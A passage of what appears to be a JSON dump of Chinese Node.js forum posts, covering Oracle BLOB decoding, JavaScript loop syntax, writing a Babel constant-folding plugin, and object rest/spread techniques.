require(&#x27;detect-character-encoding&#x27;);\n\nconst fileBuffer = fs.readFileSync(&#x27;file.txt&#x27;);\nconst charsetMatch = detectCharacterEncoding(fileBuffer);\n\nconsole.log(charsetMatch);\n&#x2F;&#x2F; {\n&#x2F;&#x2F;   encoding: &#x27;UTF-8&#x27;,\n&#x2F;&#x2F;   confidence: 60\n&#x2F;&#x2F; }\n</code></pre><p>于是乎就用这个模块对上述提到的Buffer对象进行探测，得到的编码竟然是<code>UTF-16LE</code>，然后使用这个编码进行解码，果然得到了正确的字符串。问题到此彻底解决了。</p>\n<h2>注意事项</h2>\n<ul>\n<li>探测编码时请多用一些数据样例来探测，最后使用可信度最高的编码。</li>\n<li>千万不要动态探测编码，然后动态解码，因为这个模块的探测结果是随着数据的变化而变化的。</li>\n<li>使用iconv-lite模块解码时，如果编码名称中有字母，请一律使用小写字母。</li>\n<li>一定要确保从Oracle取到的数据在Node.js环境中为Buffer对象。</li>\n</ul>\n<h2>其他说明</h2>\n<ul>\n<li>连接Oracle使用的模块是<a href=\"https://github.com/oracle/node-oracledb\">oracledb</a></li>\n<li>连接MySQL使用的模块是<a href=\"https://github.com/tgriesser/knex\">knex</a></li>\n</ul>\n<h2>总结</h2>\n<p>这次遇到的问题，其实解决方案是比较清晰的，但是在对Buffer进行解码遇到问题后没有冷静下来分析，在2个解决方案之间来回折腾浪费了很多时间；当已经很明确问题出现在哪个环节时，应该借助相关工具进一步确认问题的根源所在，比如：这次在解码环节出现了问题，而问题的根源也比较清晰，就是解码时使用的编码不对，所以就应该先明确Buffer对象所使用的编码，然后再用正确的编码进行解码即可。</p>\n</div>","title":"记一次从Oracle数据库取BLOB数据遇到的坑","last_reply_at":"2019-03-22T08:28:54.378Z","good":false,"top":false,"reply_count":12,"visit_count":681,"create_at":"2019-03-12T12:16:13.763Z","author":{"loginname":"blackmatch","avatar_url":"https://avatars3.githubusercontent.com/u/12443954?v=4&s=120"}},{"id":"5c85c7c5acb681372d416d12","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>译者按：</strong> JS 骚操作。</p>\n<ul>\n<li>原文：<a href=\"http://thecodebarbarian.com/for-vs-for-each-vs-for-in-vs-for-of-in-javascript.html\">For vs forEach() vs for/in vs for/of in JavaScript</a></li>\n<li>译者: <a href=\"https://www.fundebug.com/\">Fundebug</a></li>\n</ul>\n<p><strong>本文采用意译，版权归原作者所有</strong></p>\n<p>我们有多种方法来遍历 JavaScript 的数组或者对象，而它们之间的区别非常让人<a href=\"https://stackoverflow.com/questions/9329446/for-each-over-an-array-in-javascript\">疑惑</a>。<a href=\"http://airbnb.io/javascript/#iterators--nope\">Airbnb 编码风格</a>禁止使用 for/in 与 for/of，你知道为什么吗？</p>\n<p>这篇文章将详细介绍以下 4 种循环语法的区别：</p>\n<ul>\n<li><code>for (let i = 0; i &lt; arr.length; ++i)</code></li>\n<li><code>arr.forEach((v, i) =&gt; { /* ... */ })</code></li>\n<li><code>for (let i in arr)</code></li>\n<li><code>for (const v of arr)</code></li>\n</ul>\n<h3>语法</h3>\n<p>使用<code>for</code>和<code>for/in</code>，我们可以访问数组的下标，而不是实际的数组元素值：</p>\n<pre class=\"prettyprint language-javascript\"><code>for (let i = 0; i &lt; arr.length; ++i) {\n    console.log(arr[i]);\n}\n\nfor (let i in arr) {\n    console.log(arr[i]);\n}\n</code></pre><p>使用<code>for/of</code>，则可以直接访问数组的元素值：</p>\n<pre class=\"prettyprint language-javascript\"><code>for (const v of arr) {\n    console.log(v);\n}\n</code></pre><p>使用<code>forEach()</code>，则可以同时访问数组的下标与元素值：</p>\n<pre class=\"prettyprint language-javascript\"><code>arr.forEach((v, i) =&gt; console.log(v));\n</code></pre><h3>非数字属性</h3>\n<p>JavaScript 的数组就是 Object，这就意味着我们可以给数组添加字符串属性：</p>\n<pre class=\"prettyprint language-javascript\"><code>const arr = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;];\n\ntypeof arr; &#x2F;&#x2F; &#x27;object&#x27;\n\narr.test = &quot;bad&quot;; &#x2F;&#x2F; 添加非数字属性\n\narr.test; &#x2F;&#x2F; &#x27;abc&#x27;\narr[1] === arr[&quot;1&quot;]; &#x2F;&#x2F; true, JavaScript数组只是特殊的Object\n</code></pre><p>4 种循环语法，只有<code>for/in</code>不会忽略非数字属性：</p>\n<pre class=\"prettyprint language-javascript\"><code>const arr = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;];\narr.test = &quot;bad&quot;;\n\nfor (let i in arr) {\n    console.log(arr[i]); &#x2F;&#x2F; 打印&quot;a, b, c, bad&quot;\n}\n</code></pre><p>正因为如此，<a href=\"https://stackoverflow.com/questions/500504/why-is-using-for-in-with-array-iteration-a-bad-idea\">使用<code>for/in</code>遍历数组并不好</a>。</p>\n<p>其他 3 种循环语法，都会忽略非数字属性：</p>\n<pre class=\"prettyprint language-javascript\"><code>const arr = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;];\narr.test = &quot;abc&quot;;\n\n&#x2F;&#x2F; 打印 &quot;a, b, c&quot;\nfor (let i = 0; i &lt; arr.length; ++i) {\n    console.log(arr[i]);\n}\n\n&#x2F;&#x2F; 打印 &quot;a, b, c&quot;\narr.forEach((el, i) =&gt; console.log(i, el));\n\n&#x2F;&#x2F; 打印 &quot;a, b, c&quot;\nfor (const el of arr) {\n    console.log(el);\n}\n</code></pre><p><strong>要点：</strong> 避免使用<code>for/in</code>来遍历数组，除非你真的要想要遍历非数字属性。可以使用 ESLint 的<a href=\"https://eslint.org/docs/rules/guard-for-in\">guard-for-in</a>规则来禁止使用<code>for/in</code>。</p>\n<h3>数组的空元素</h3>\n<p>JavaScript 数组可以有<a href=\"https://stackoverflow.com/questions/281264/remove-empty-elements-from-an-array-in-javascript\">空元素</a>。以下代码语法是正确的，且数组长度为 3：</p>\n<pre class=\"prettyprint language-javascript\"><code>const arr = [&quot;a&quot;, , &quot;c&quot;];\n\narr.length; &#x2F;&#x2F; 3\n</code></pre><p>让人更加不解的一点是，循环语句处理<code>['a',, 'c']</code>与<code>['a', undefined, 'c']</code>的方式并不相同。</p>\n<p>对于<code>['a',, 'c']</code>，<code>for/in</code>与<code>forEach</code>会跳过空元素，而<code>for</code>与<code>for/of</code>则不会跳过。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 打印&quot;a, undefined, c&quot;\nfor (let i = 0; i &lt; arr.length; ++i) {\n    console.log(arr[i]);\n}\n\n&#x2F;&#x2F; 打印&quot;a, c&quot;\narr.forEach(v =&gt; console.log(v));\n\n&#x2F;&#x2F; 打印&quot;a, c&quot;\nfor (let i in arr) {\n    console.log(arr[i]);\n}\n\n&#x2F;&#x2F; 打印&quot;a, undefined, c&quot;\nfor (const v of arr) {\n    console.log(v);\n}\n</code></pre><p>对于<code>['a', undefined, 'c']</code>，4 种循环语法一致，打印的都是&quot;a, undefined, c&quot;。</p>\n<p>还有一种添加空元素的方式：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 等价于&#96;[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;,, &#x27;e&#x27;]&#96;\nconst arr = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;];\narr[5] = &quot;e&quot;;\n</code></pre><p>还有一点，JSON 也不支持空元素：</p>\n<pre class=\"prettyprint language-javascript\"><code>JSON.parse(&#x27;{&quot;arr&quot;:[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]}&#x27;);\n&#x2F;&#x2F; { arr: [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; ] }\n\nJSON.parse(&#x27;{&quot;arr&quot;:[&quot;a&quot;,null,&quot;c&quot;]}&#x27;);\n&#x2F;&#x2F; { arr: [ &#x27;a&#x27;, null, &#x27;c&#x27; ] }\n\nJSON.parse(&#x27;{&quot;arr&quot;:[&quot;a&quot;,,&quot;c&quot;]}&#x27;);\n&#x2F;&#x2F; SyntaxError: Unexpected token , in JSON at position 12\n</code></pre><p><strong>要点：</strong> <code>for/in</code>与<code>forEach</code>会跳过空元素，数组中的空元素被称为<a href=\"http://2ality.com/2013/07/array-iteration-holes.html\">&quot;holes&quot;</a>。如果你想避免这个问题，可以考虑禁用<code>forEach</code>:</p>\n<pre class=\"prettyprint language-yml\"><code>parserOptions:\n    ecmaVersion: 2018\nrules:\n    no-restricted-syntax:\n        - error\n        - selector: CallExpression[callee.property.name=&quot;forEach&quot;]\n          message: Do not use &#96;forEach()&#96;, use &#96;for&#x2F;of&#96; instead\n</code></pre><h3>函数的 this</h3>\n<p><code>for</code>，<code>for/in</code>与<code>for/of</code>会保留外部作用域的<code>this</code>。</p>\n<p>对于<code>forEach</code>， 除非使用箭头函数，它的回调函数的 this 将会变化。</p>\n<p>使用 Node v11.8.0 测试下面的代码，结果如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&quot;use strict&quot;;\n\nconst arr = [&quot;a&quot;];\n\narr.forEach(function() {\n    console.log(this); &#x2F;&#x2F; 打印undefined\n});\n\narr.forEach(() =&gt; {\n    console.log(this); &#x2F;&#x2F; 打印{}\n});\n</code></pre><p><strong>要点：</strong> 使用 ESLint 的<a href=\"https://eslint.org/docs/rules/prefer-arrow-callback\"><code>no-arrow-callback</code></a>规则要求所有回调函数必须使用箭头函数。</p>\n<h3>Async/Await 与 Generators</h3>\n<p>还有一点，<code>forEach()</code>不能与 Async/Await 及 Generators 很好的&quot;合作&quot;。</p>\n<p>不能在<code>forEach</code>回调函数中使用 await：</p>\n<pre class=\"prettyprint language-javascript\"><code>async function run() {\n  const arr = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;];\n  arr.forEach(el =&gt; {\n    &#x2F;&#x2F; SyntaxError\n    await new Promise(resolve =&gt; setTimeout(resolve, 1000));\n    console.log(el);\n  });\n}\n</code></pre><p>不能在<code>forEach</code>回调函数中使用 yield：</p>\n<pre class=\"prettyprint language-javascript\"><code>function run() {\n  const arr = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;];\n  arr.forEach(el =&gt; {\n    &#x2F;&#x2F; SyntaxError\n    yield new Promise(resolve =&gt; setTimeout(resolve, 1000));\n    console.log(el);\n  });\n}\n</code></pre><p>对于<code>for/of</code>来说，则没有这个问题:</p>\n<pre class=\"prettyprint language-javascript\"><code>async function asyncFn() {\n    const arr = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;];\n    for (const el of arr) {\n        await new Promise(resolve =&gt; setTimeout(resolve, 1000));\n        console.log(el);\n    }\n}\n\nfunction* generatorFn() {\n    const arr = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;];\n    for (const el of arr) {\n        yield new Promise(resolve =&gt; setTimeout(resolve, 1000));\n        console.log(el);\n    }\n}\n</code></pre><p>当然，你如果将<code>forEach()</code>的回调函数定义为 async 函数就不会报错了，但是，如果你想让<code>forEach</code><a href=\"https://thecodebarbarian.com/basic-functional-programming-with-async-await.html\">按照顺序执行</a>，则会比较头疼。</p>\n<p>下面的代码会按照从大到小打印 0-9：</p>\n<pre class=\"prettyprint language-javascript\"><code>async function print(n) {\n    &#x2F;&#x2F; 打印0之前等待1秒，打印1之前等待0.9秒\n    await new Promise(resolve =&gt; setTimeout(() =&gt; resolve(), 1000 - n * 100));\n    console.log(n);\n}\n\nasync function test() {\n    [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].forEach(print);\n}\n\ntest();\n</code></pre><p><strong>要点：</strong> 尽量不要在<code>forEach</code>中使用 aysnc/await 以及 generators。</p>\n<h3>结论</h3>\n<p>简单地说，<code>for/of</code>是遍历数组最可靠的方式，它比<code>for</code>循环简洁，并且没有<code>for/in</code>和<code>forEach()</code>那么多奇怪的特例。<code>for/of</code>的缺点是我们取索引值不方便，而且不能这样链式调用<code>forEach()</code>. <code>forEach()</code>。</p>\n<p>使用<code>for/of</code>获取数组索引，可以这样写：</p>\n<pre class=\"prettyprint language-javascript\"><code>for (const [i, v] of arr.entries()) {\n    console.log(i, v);\n}\n</code></pre><h3>参考</h3>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/9329446/for-each-over-an-array-in-javascript\">For-each over an array in JavaScript?</a></li>\n<li><a href=\"https://stackoverflow.com/questions/500504/why-is-using-for-in-with-array-iteration-a-bad-idea\">Why is using “for…in” with array iteration a bad idea?</a></li>\n<li><a href=\"http://2ality.com/2013/07/array-iteration-holes.html\">Array iteration and holes in JavaScript</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<h3>版权声明</h3>\n<p>转载时请注明作者<a href=\"https://www.fundebug.com/\">Fundebug</a>以及本文地址：\n<a href=\"https://blog.fundebug.com/2019/03/11/4-ways-to-loop-array-inj-javascript/\">https://blog.fundebug.com/2019/03/11/4-ways-to-loop-array-inj-javascript/</a></p>\n</div>","title":"JavaScript 的 4 种数组遍历方法： for VS forEach() VS for/in VS for/of","last_reply_at":"2019-03-22T07:34:36.771Z","good":false,"top":false,"reply_count":4,"visit_count":879,"create_at":"2019-03-11T02:28:21.879Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5a9317d38d6e16e56bb808d1","author_id":"5909444b782dbc4b183ecfe2","tab":"share","content":"<div class=\"markdown-text\"><p>也就前两天，面试大厂，其中有那么一个问题:</p>\n<ol>\n<li>你了解过Babel吗？</li>\n</ol>\n<blockquote>\n<p>了解过抽象语法树，又称AST，有学习过，也写过一个基于AST的<a href=\"https://github.com/axetroy/pag\">乞丐版模板引擎</a>，先是词法解析token，然后生产抽象语法树，然后更改抽象语法树，当然这是插件做的事情，最后根据新的AST生成代码。</p>\n</blockquote>\n<ol>\n<li>写过Babel插件吗</li>\n</ol>\n<blockquote>\n<p>没有，只是看过相关文档</p>\n</blockquote>\n<ol>\n<li>如果让你写一个插件，你能写的出来吗?</li>\n</ol>\n<blockquote>\n<p>应该可以吧…</p>\n</blockquote>\n<p>遂卒…</p>\n<p>开玩笑的，既然提到了，又没回答上来什么，哎哟我这暴脾气，一想到今晚就睡不着，连夜把它撸了。</p>\n<p>那么我们来从零写个插件吧。</p>\n<p>写一个预计算简单表达式的插件</p>\n<h3>预览</h3>\n<p>Before:</p>\n<pre class=\"prettyprint language-javascript\"><code>const result = 1 + 2 + 3 + 4 + 5;\n</code></pre><p>After:</p>\n<pre class=\"prettyprint language-javascript\"><code>const result = 15;\n</code></pre><p>以上的例子可能大家不会经常遇到，因为傻x才会这么写，但是有可能你会这么写</p>\n<pre class=\"prettyprint language-javascript\"><code>setTimeout(function(){\n  &#x2F;&#x2F; do something\n}, 1000 * 2) &#x2F;&#x2F; 插件要做的事，就是把 1000 * 2 替换成 2000\n</code></pre><h3>前提条件</h3>\n<ul>\n<li><a href=\"https://github.com/jamiebuilds/babel-handbook/blob/master/translations/zh-Hans/plugin-handbook.md\">Babel相关概念</a></li>\n</ul>\n<h3>开工</h3>\n<p>再写代码之前，你需要明白Babel它的原理，简单点说： <strong>Babel解析成AST，然后插件更改AST，最后由Babel输出代码</strong></p>\n<p>那么Babel的插件模块需要你暴露一个function，function内返回visitor</p>\n<pre class=\"prettyprint language-javascript\"><code>module.export = function(babel){\n  return {\n    visitor:{\n    }\n  }\n}\n</code></pre><p>visitor是对各类型的AST节点做处理的地方，那么我们怎么知道Babel生成了的AST有哪些节点呢？</p>\n<p>很简单，你可以把Babel转换的结果打印出来，或者这里有传送门: <a href=\"https://astexplorer.net/\">AST explorer</a></p>\n<p><img src=\"https://user-images.githubusercontent.com/9758711/36645536-6165e5c2-1aa5-11e8-8bd1-fad3e2080658.JPG\" alt=\"1\"></p>\n<p>这里我们看到 <code>const result = 1 + 2</code>中的<code>1 + 1</code>是一个<code>BinaryExpression</code>节点，那么在visitor中，我们就处理这个节点</p>\n<pre class=\"prettyprint language-javascript\"><code>var babel = require(&#x27;babel-core&#x27;);\nvar t = require(&#x27;babel-types&#x27;);\n\nconst visitor = {\n  BinaryExpression(path) {\n    const node = path.node;\n    let result;\n    &#x2F;&#x2F; 判断表达式两边，是否都是数字\n    if (t.isNumericLiteral(node.left) &amp;&amp; t.isNumericLiteral(node.right)) {\n      &#x2F;&#x2F; 根据不同的操作符作运算\n      switch (node.operator) {\n        case &quot;+&quot;:\n          result = node.left.value + node.right.value;\n          break\n        case &quot;-&quot;:\n          result = node.left.value - node.right.value;\n          break;\n        case &quot;*&quot;:\n          result =  node.left.value * node.right.value;\n          break;\n        case &quot;&#x2F;&quot;:\n          result =  node.left.value &#x2F; node.right.value;\n          break;\n        case &quot;**&quot;:\n          let i = node.right.value;\n          while (--i) {\n            result = result || node.left.value;\n            result =  result * node.left.value;\n          }\n          break;\n        default:\n      }\n    }\n\n    &#x2F;&#x2F; 如果上面的运算有结果的话\n    if (result !== undefined) {\n      &#x2F;&#x2F; 把表达式节点替换成number字面量\n      path.replaceWith(t.numericLiteral(result));\n    }\n  }\n};\n\nmodule.exports = function (babel) {\n  return {\n    visitor\n  };\n}\n</code></pre><p>插件写好了，我们运行下插件试试</p>\n<pre class=\"prettyprint language-javascript\"><code>const babel = require(&quot;babel-core&quot;);\n\nconst result = babel.transform(&quot;const result = 1 + 2;&quot;,{\n  plugins:[\n    require(&quot;.&#x2F;index&quot;)\n  ]\n});\n\nconsole.log(result.code); &#x2F;&#x2F; const result = 3;\n</code></pre><p>与预期一致，那么转换 <code>const result = 1 + 2 + 3 + 4 + 5;</code>呢?</p>\n<p>结果是: <code>const result = 3 + 3 + 4 + 5;</code></p>\n<p>这就奇怪了，为什么只计算了<code>1 + 2</code>之后，就没有继续往下运算了?</p>\n<p>我们看一下这个表达式的AST树</p>\n<p><img src=\"https://user-images.githubusercontent.com/9758711/36645660-2bdd028a-1aa7-11e8-9131-c38c232ccb10.JPG\" alt=\"2\"></p>\n<p>你会发现Babel解析成表达式里面再嵌套表达式。</p>\n<pre class=\"prettyprint\"><code>表达式( 表达式( 表达式( 表达式(1 + 2) + 3) + 4) + 5)\n</code></pre><p>而我们的判断条件并不符合所有的，只符合<code>1 + 2</code></p>\n<pre class=\"prettyprint language-javascript\"><code>    &#x2F;&#x2F; 判断表达式两边，是否都是数字\n    if (t.isNumericLiteral(node.left) &amp;&amp; t.isNumericLiteral(node.right)) {}\n</code></pre><p>那么我们得改一改</p>\n<p>第一次计算<code>1 + 2</code>之后，我们会得到这样的表达式</p>\n<pre class=\"prettyprint\"><code>表达式( 表达式( 表达式(3 + 3) + 4) + 5)\n</code></pre><p>其中 <code>3 + 3</code>又符合了我们的条件， 我们通过向上递归的方式遍历父级节点</p>\n<p>又转换成这样:</p>\n<pre class=\"prettyprint\"><code>表达式( 表达式(6 + 4) + 5)\n表达式(10 + 5)\n15\n</code></pre><pre class=\"prettyprint language-javascript\"><code>    &#x2F;&#x2F; 如果上面的运算有结果的话\n    if (result !== undefined) {\n      &#x2F;&#x2F; 把表达式节点替换成number字面量\n      path.replaceWith(t.numericLiteral(result));\n\n      let parentPath = path.parentPath;\n\n      &#x2F;&#x2F; 向上遍历父级节点\n      parentPath &amp;&amp; visitor.BinaryExpression.call(this, parentPath);\n    }\n</code></pre><p>到这里，我们就得出了结果 <code>const result = 15;</code></p>\n<p>那么其他运算呢:</p>\n<p><code>const result = 100 + 10 - 50</code> &gt;&gt;&gt; <code>const result = 60;</code></p>\n<p><code>const result = (100 / 2) + 50</code> &gt;&gt;&gt; <code>const result = 100;</code></p>\n<p><code>const result = (((100 / 2) + 50 * 2) / 50) ** 2</code> &gt;&gt;&gt; <code>const result = 9;</code></p>\n<h3>完结</h3>\n<p>到这里，已经向你大概的讲解了，如何编写一个Babel插件，再也不怕面试官问我答不出什么了哈…</p>\n<p>你以为这就完了吗?</p>\n<p>并没有</p>\n<p>如果转换这样呢: <code>const result = 0.1 + 0.2;</code></p>\n<p>预期肯定是<code>0.3</code>, 但是实际上，Javascript有浮点计算误差，得出的结果是<code>0.30000000000000004</code></p>\n<p>那是不是这个插件就没卵用？</p>\n<p>这就需要你去矫正浮点运算误差了，可以使用<a href=\"https://github.com/MikeMcl/big.js\">Big.js</a>;</p>\n<p>比如: <code>result = node.left.value + node.right.value;</code> 改成 <code>result = +new Big(node.left.value).plus(node.right.value);</code></p>\n<p>你以为完了吗? 这个插件还可以做很多</p>\n<p>比如: <code>Math.PI * 2</code> &gt;&gt;&gt; <code>6.283185307179586</code></p>\n<p>比如: <code>Math.pow(2, 2)</code> &gt;&gt;&gt; <code>4</code></p>\n<p>…</p>\n<p>…</p>\n<p>最后上项目地址: <a href=\"https://github.com/axetroy/babel-plugin-pre-calculate-number\">https://github.com/axetroy/babel-plugin-pre-calculate-number</a></p>\n</div>","title":"面试官: 你了解过Babel吗？写过Babel插件吗? 答: 没有。卒","last_reply_at":"2019-03-22T06:47:52.610Z","good":true,"top":false,"reply_count":52,"visit_count":11569,"create_at":"2018-02-25T20:08:51.322Z","author":{"loginname":"axetroy","avatar_url":"https://avatars2.githubusercontent.com/u/9758711?v=4&s=120"}},{"id":"5c943f1afd41137eb7660584","author_id":"58058ff1487e1e4578afb5c2","tab":"share","content":"<div class=\"markdown-text\"><p>大家有没有发现，有的时候题目，比题目本身更难，经常读不懂题目，应该是我英文太差了吧</p>\n</div>","title":"关于leetcode","last_reply_at":"2019-03-22T03:25:42.759Z","good":false,"top":false,"reply_count":2,"visit_count":427,"create_at":"2019-03-22T01:49:14.918Z","author":{"loginname":"luanxuechao","avatar_url":"https://avatars1.githubusercontent.com/u/13465762?v=4&s=120"}},{"id":"5c942d8500bcfd7eb2be4ca7","author_id":"5a0a5c9da57c17282e120654","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/22/169a2cd15dff8805?w=800&amp;h=530&amp;f=png&amp;s=508261\" alt=\"20190322082820.png\"></p>\n<h1>[译]使用 JavaScript 对象 Rest 和 Spread 的7个技巧</h1>\n<ul>\n<li>原文作者：Joel Thoms</li>\n<li>原文标题：7 Tricks with Resting and Spreading JavaScript Objects</li>\n<li>原文：<a href=\"https://blog.bitsrc.io/6-tricks-with-resting-and-spreading-javascript-objects-68d585bdc83\">https://blog.bitsrc.io/6-tricks-with-resting-and-spreading-javascript-objects-68d585bdc83</a></li>\n</ul>\n<p>Rest 和 Spread 操作符不仅仅可以用于让参数休息和扩展数组。</p>\n<p>下面针对 JavaScript 对象时使用 Rest 和 Spread 时的 7 个鲜为人知的技巧。</p>\n<h2>添加属性</h2>\n<p>克隆一个对象，同时向(浅)克隆对象添加附加属性。</p>\n<p>在这个示例中，user 被克隆，password 属性被添加到 userWithPass 中。</p>\n<pre class=\"prettyprint language-js\"><code>const user = { id: 100, name: &#x27;Howard Moon&#x27;}\nconst userWithPass = { ...user, password: &#x27;Password!&#x27; }\n\nuser &#x2F;&#x2F;=&gt; { id: 100, name: &#x27;Howard Moon&#x27; }\nuserWithPass &#x2F;&#x2F;=&gt; { id: 100, name: &#x27;Howard Moon&#x27;, password: &#x27;Password!&#x27; }\n</code></pre><h2>对象合并</h2>\n<p>将两个对象合并到一个新对象中。</p>\n<p>将 Part1 和 Part2 合并到 user1中。</p>\n<pre class=\"prettyprint language-js\"><code>const part1 = { id: 100, name: &#x27;Howard Moon&#x27; }\nconst part2 = { id: 100, password: &#x27;Password!&#x27; }\n\nconst user1 = { ...part1, ...part2 }\n&#x2F;&#x2F;=&gt; { id: 100, name: &#x27;Howard Moon&#x27;, password: &#x27;Password!&#x27; }\n</code></pre><p>对象也可以使用以下语法合并:</p>\n<pre class=\"prettyprint language-js\"><code>const partial = { id: 100, name: &#x27;Howard Moon&#x27; }\nconst user = { ...partial, id: 100, password: &#x27;Password!&#x27; }\n\nuser &#x2F;&#x2F;=&gt; { id: 100, name: &#x27;Howard Moon&#x27;, password: &#x27;Password!&#x27; }\n</code></pre><h2>排除对象属性</h2>\n<p>可以结合使用解构 rest 运算符删除属性。 在这里，password 被删除 ，其余的属性作为 rest 返回。</p>\n<pre class=\"prettyprint language-js\"><code>const noPassword = ({ password, ...rest }) =&gt; rest\nconst user = {\n  id: 100,\n  name: &#x27;Howard Moon&#x27;,\n  password: &#x27;Password!&#x27;\n}\n\nnoPassword(user) &#x2F;&#x2F;=&gt; { id: 100, name: &#x27;Howard moon&#x27; }\n</code></pre><h2>动态排除属性</h2>\n<p>函数接受一个 prop 作为参数。使用计算对象属性名称，可以从克隆中动态地删除属性。</p>\n<pre class=\"prettyprint language-js\"><code>const user1 = {\n  id: 100,\n  name: &#x27;Howard Moon&#x27;,\n  password: &#x27;Password!&#x27;\n}\nconst removeProperty = prop =&gt; ({ [prop]: _, ...rest }) =&gt; rest\n&#x2F;&#x2F;                     ----       ------\n&#x2F;&#x2F;                          \\   &#x2F;\n&#x2F;&#x2F;                dynamic destructuring\n\nconst removePassword = removeProperty(&#x27;password&#x27;)\nconst removeId = removeProperty(&#x27;id&#x27;)\n\nremovePassword(user1) &#x2F;&#x2F;=&gt; { id: 100, name: &#x27;Howard Moon&#x27; }\nremoveId(user1) &#x2F;&#x2F;=&gt; { name: &#x27;Howard Moon&#x27;, password: &#x27;Password!&#x27; }\n</code></pre><h2>对属性进行排序</h2>\n<p>有时性质并不按照我们需要的顺序排列。 使用一些技巧，我们可以将属性推到列表的顶部，或者将它们移到底部。</p>\n<p>若要将 id 移动到第一个位置，在扩展对象之前将 <code>id: undefined</code> 添加到新的 Object 最前面。</p>\n<pre class=\"prettyprint language-js\"><code>const user3 = {\n  password: &#x27;Password!&#x27;,\n  name: &#x27;Naboo&#x27;,\n  id: 300\n}\n\nconst organize = object =&gt; ({ id: undefined, ...object })\n&#x2F;&#x2F;                            -------------\n&#x2F;&#x2F;                          &#x2F;\n&#x2F;&#x2F;  move id to the first property\n\norganize(user3)\n&#x2F;&#x2F;=&gt; { id: 300, password: &#x27;Password!&#x27;, name: &#x27;Naboo&#x27; }\n</code></pre><p>若要将 password 移到最后一个属性，请从对象中解构 password。然后在使用 Rest 操作符后重新设置 password 属性。</p>\n<pre class=\"prettyprint language-js\"><code>const user3 = {\n  password: &#x27;Password!&#x27;,\n  name: &#x27;Naboo&#x27;,\n  id: 300\n}\n\nconst organize = ({ password, ...object }) =&gt;\n  ({ ...object, password })\n&#x2F;&#x2F;              --------\n&#x2F;&#x2F;             &#x2F;\n&#x2F;&#x2F; move password to last property\n\norganize(user3)\n&#x2F;&#x2F;=&gt; { name: &#x27;Naboo&#x27;, id: 300, password: &#x27;Password!&#x27; }\n</code></pre><h2>默认属性</h2>\n<p>默认属性是仅当它们不包含在原始对象中时才设置的值。</p>\n<p>在本例中，user2 不包含 quotes 属性。 setdefaults 函数确保所有对象都设置了 quotes 属性，否则它将被设置为<code>[]</code>。</p>\n<p>当调用 setDefaults (user2)时，返回值将包含 quotes 属性: <code>[]</code>。</p>\n<p>在调用 setDefaults (user4)时，因为 user4 已经有了 quotes 属性，所以不会修改该属性。</p>\n<pre class=\"prettyprint language-js\"><code>const user2 = {\n  id: 200,\n  name: &#x27;Vince Noir&#x27;\n}\n\nconst user4 = {\n  id: 400,\n  name: &#x27;Bollo&#x27;,\n  quotes: [&quot;I&#x27;ve got a bad feeling about this...&quot;]\n}\n\nconst setDefaults = ({ quotes = [], ...object}) =&gt;\n  ({ ...object, quotes })\n\nsetDefaults(user2)\n&#x2F;&#x2F;=&gt; { id: 200, name: &#x27;Vince Noir&#x27;, quotes: [] }\n\nsetDefaults(user4)\n&#x2F;&#x2F;=&gt; {\n&#x2F;&#x2F;=&gt;   id: 400,\n&#x2F;&#x2F;=&gt;   name: &#x27;Bollo&#x27;,\n&#x2F;&#x2F;=&gt;   quotes: [&quot;I&#x27;ve got a bad feeling about this...&quot;]\n&#x2F;&#x2F;=&gt; }\n</code></pre><p>如果你希望默认值先出现而不是后出现，也可以这样写:</p>\n<pre class=\"prettyprint language-js\"><code>const setDefaults = ({ ...object}) =&gt; ({ quotes: [], ...object })\n</code></pre><h2>属性重命名</h2>\n<p>通过结合上面的技术，可以创建一个函数来重命名属性。</p>\n<p>假设有一些大写 ID 的对象属性名应该是小写的 id。 首先从对象解构 ID 然后在对象 Spread 时将其作为 id 添加回去。</p>\n<pre class=\"prettyprint language-js\"><code>const renamed = ({ ID, ...object }) =&gt; ({ id: ID, ...object })\n\nconst user = {\n  ID: 500,\n  name: &quot;Bob Fossil&quot;\n}\n\nrenamed(user) &#x2F;&#x2F;=&gt; { id: 500, name: &#x27;Bob Fossil&#x27; }\n</code></pre><h2>附赠：添加条件属性</h2>\n<p>感谢 <code>@vinialbano</code> 指出你也可以有条件地添加属性。 在这个例子中，只有当 password 是真实的时候才会添加 password！</p>\n<pre class=\"prettyprint language-js\"><code>const user = { id: 100, name: &#x27;Howard Moon&#x27; }\nconst password = &#x27;Password!&#x27;\nconst userWithPassword = {\n  ...user,\n  id: 100,\n  ...(password &amp;&amp; { password })\n}\n\nuserWithPassword &#x2F;&#x2F;=&gt; { id: 100, name: &#x27;Howard Moon&#x27;, password: &#x27;Password!&#x27; }\n</code></pre><h2>摘要</h2>\n<p>我试着列出了一些鲜为人知的 Spread 和 Rest 技巧，如果你知道任何我没有列在这里技巧，请在评论区里让每个人都知道！如果你从中学到了新的东西，请在 Twitter 上和你的朋友分享，这真的很有帮助！</p>\n<p>请在这里或者推特 <a href=\"/user/joelnet\">@joelnet</a> 